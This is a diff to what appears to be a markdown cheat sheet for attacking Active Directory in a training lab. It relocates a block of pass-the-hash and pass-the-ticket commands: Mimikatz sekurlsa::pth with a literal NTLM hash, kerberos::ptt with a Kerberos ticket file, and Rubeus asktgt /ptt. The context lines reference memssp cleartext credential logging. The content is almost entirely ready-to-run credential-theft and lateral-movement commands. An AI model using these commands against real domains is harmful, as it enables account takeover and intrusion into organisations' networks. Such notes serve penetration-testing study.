@@ -246,6 +246,19 @@ If functions not on remote host:-
 
 * * *
 
+
+
+#### Mimikatz Pass-the-hash
+```Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"' ```
+
+#### Mimikatz Pass-the-ticket
+```Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;6f5638a]-2-0-60a10000- Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'```
+
+#### Rubeus Pass-the-ticket
+```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
+
+* * *
+
 # Mimikatz 
 https://adsecurity.org/?page_id=1821
 
@@ -349,17 +362,6 @@ misc::skeleton
  MemSSP logs local logons, service account and machine account passwords in clear text on the target server:-
  
 ```Invoke-Mimikatz -Command '"misc::memssp"'``` - Logs local logons to C:\Windows\system32\kiwissp.log
-
-* * *
-
-#### Mimikatz Pass-the-hash
-```Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"' ```
-
-#### Mimikatz Pass-the-ticket
-```Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;6f5638a]-2-0-60a10000- Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'```
-
-#### Rubeus Pass-the-ticket
-```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
 
 * * *
